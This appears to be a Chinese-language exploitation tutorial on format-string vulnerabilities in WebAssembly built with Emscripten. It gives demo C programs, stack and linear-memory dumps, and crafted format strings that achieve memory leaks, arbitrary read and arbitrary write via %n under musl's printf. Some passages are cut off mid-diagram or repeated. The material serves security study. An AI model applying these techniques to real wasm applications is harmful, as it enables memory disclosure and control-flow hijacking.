## 前置知识
  * wasm不是asm.
  * wasm可以提高一些复杂计算的速度,比如[一些游戏](https://files.unity3d.com/jonas/AngryBots/)
  * wasm的内存布局不同与常见的x86体系,wasm分为线性内存、执行堆栈、局部变量等.
  * wasm在调用函数时,由执行堆栈保存函数参数,以`printf`函数为例,其函数原型为
    int printf(const char *restrict fmt, ...);
函数的参数分别为
>   * 格式化字符串
>
>   * 格式化字符串参数列表
>
>
我们编译以下代码
    // emcc test.c -s WASM=1 -o test.js -g3
    #include 
    #include 
    void EMSCRIPTEN_KEEPALIVE test()
    {
        sprintf("%d%d%d%d", 1, 2, 3, 4);
        return;
    }
在chrome中调试,可以看到在调用`printf`函数时执行堆栈的内容为
    stack:
    0: 1900
    1: 4816
其中的0,1分别为`printf`的两个参数,1900,4816分别指向参数对应的线性内存地址,拿1900为例,其在线性内存中的值为
    1900: 37
    1901: 100
    1902: 37
    1903: 100
    1904: 37
    1905: 100
    1906: 37
    1907: 100
    1908: 0
即`%d%d%d%d\x00`
## 部分读
### 获取栈上变量的值
当存在格式化字符串漏洞时,我们可以直接通过`%d%d%d%d`来泄露栈上的值
    // emcc test.c -s WASM=1 -o test.js -g3
    #include 
    #include 
    void EMSCRIPTEN_KEEPALIVE test()
    {
        int i[0x2];
        i[0] = 0x41414141;
        i[1] = 0x42424242;
        sprintf("%d%d%d%d");
        return;                                                                                                                   
    }
当我们执行到`printf`时,执行堆栈为
    stack:
    0: 1900
    1: 4816
第二个参数4816即为`va_list`的指针,查看线性内存中的值可以看到我们正好可以泄露变量i的值
    4816: 0
    4817: 0
    4818: 0
    4819: 0
    4820: 0
    4821: 0
    4822: 0
    4823: 0
    4824: 65
    4825: 65
    4826: 65
    4827: 65
    4828: 66
    4829: 66
    4830: 66
    4831: 66
### 泄露被调用函数中的值
除此之外,由于线性内存地址由低到高增长,所以格式化字符串还可以泄露出被调用函数的某些值
    // emcc test.c -s WASM=1 -o test.js -g3
    #include 
    #include 
    void sub()
    {
      char password[] = "password";
      return;
    }
    void EMSCRIPTEN_KEEPALIVE test()
    {
      sub();
      printf("%d%d%d%d%d%d");
      return;
    }
当调用`sub()`时,线性内存布局为
    +-----------+
    |           |
    +-----------+
    |           |
    +-----------+ 
    #include 
    void EMSCRIPTEN_KEEPALIVE main()
    {
      char fmt[0xf] = "%d%d%d%s\x00\x13\x00\x00";
      printf(fmt);
      puts("");
      return;
    }
其中`puts()`函数用于刷新缓冲流
当调用`printf`时调用堆栈的参数为
    stack:
    0: 4884
    1: 4880
查看线性内存布局
    +-----------+ 
    #include 
    void EMSCRIPTEN_KEEPALIVE main()
    {
      char fmt[0x10] = "%d%d%d%s\x00\x13\x00\x00";
      printf(fmt);
      puts("");
      return;
    }
只需将fmt数字改为`0x10`size,此时我们再查看函数执行堆栈
    stack:
    0: 4880  +--------+ 
    #include 
    void EMSCRIPTEN_KEEPALIVE main()
    {
      char fmt[0x10] = "%d%d%d%s\x00\x13\x00\x00";
      printf(fmt);
      puts("");
      return;
    }
此时fmt大于`0x10`,而`va_list`作为一个隐式的变量,其小于`0x10`,因此会被放入高地址处,在这种情况下,我们是没有办法通过在`fmt`中构造地址来泄露内存,当然,我们仍然可以通过调用一个函数来达到这个目的,比如说
    // emcc test.c -s WASM=1 -o test.html -g3
    #include 
    #include 
    void sub()
    {
      char target[] = "\x00\x13\x00\x00";
    }
    void EMSCRIPTEN_KEEPALIVE main()
    {
      char fmt[0x10] = "%d%d%d%d%s";
      sub();
      printf(fmt);
      puts("");
      return;
    }
另一种方法就是通过溢出,当存在溢出时,我们可以将需要的值溢出到`va_list`中
    #include 
    #include 
    void EMSCRIPTEN_KEEPALIVE main()
    {
      char fmt[0x10] = "%sAABBBBCCCCDDDD";
      // overflow two bytes
      fmt[0x10] = '\x00';
      fmt[0x11] = '\x13';
      printf(fmt);
      puts("");
      return;
    }
由于此时`va_list`位于高地址处,只需要溢出很少的字节就可以做到任意地址读
## 任意写
任意写和任意读很相似,加上wasm通常可以通过函数索引来达到控制程序流的目的,格式化字符串的任意写很实用
通常为了实现任意写我们会构造为
    %[value]d%k$n[addr]
比如
    // emcc test.c -s WASM=1 -o test.html -g3
    #include 
    #include                                                                                                             
    int flag;
    void getflag()
    {
      if(flag == 1)
      {
        printf("YouGotIt!");
      }
      return;
    }
    void EMSCRIPTEN_KEEPALIVE main()
    {
      flag = 3;
      char fmt[0xf] = "%01d%4$n\xd0\x0b\x00\x00";
      printf(fmt);
      getflag();
      return;
    }
其中`flag`地址为`0xbd0`,正常来讲,我们打印了一个字符,这时对`va_list`的第四个参数即`flag`的地址赋值时会为1
但是结果`getflag()`函数并不会正确输出,再debug一下会发现调用`printf`函数后会报错
    stack:
    0: -1
这是因为`emscripten`编译器并未使用`glibc`,而是采用的`musl`的libc,其源码可以在[emscripten](https://github.com/emscripten-core/emscripten/tree/incoming/system/lib/libc/musl)项目下查看,`printf`的核心在`printf_core`中
    // emscripten-incoming/system/lib/libc/musl/src/stdio/vfprintf.c 693
    for (i=1; i   * 存在%(k+1)\$n则必须存在%(k)$n
>   * (k)与(k+1)之间没有先后顺序
>   * 最多有`NL_ARGMAX`个格式化字符串标志
>   * 需要在%d之前使用%k$d(忘了写注释,这段的源码忘记在哪里了,`printf`在输出%d后会返回)
>
所以musl中的`printf`大致相当于glibc中`__printf_chk`的弟弟版,因此为了实现任意写,我们可能需要写一个奇形怪状的格式化字符串
    #include 
    #include 
    #include 
    int flag;
    void getflag()
    {
      if(flag == 1)
      {
        printf("YouGotIt!\n");
      }
      return;
    }
    void EMSCRIPTEN_KEEPALIVE main()
    {
      flag = 3;
      char fmt[0x10];
      memcpy(fmt, "A%2$n%1$xBBBCCCCDDDD\xe0\x0b\x00\x00", 24);
      printf(fmt);
      getflag();
      return;
    }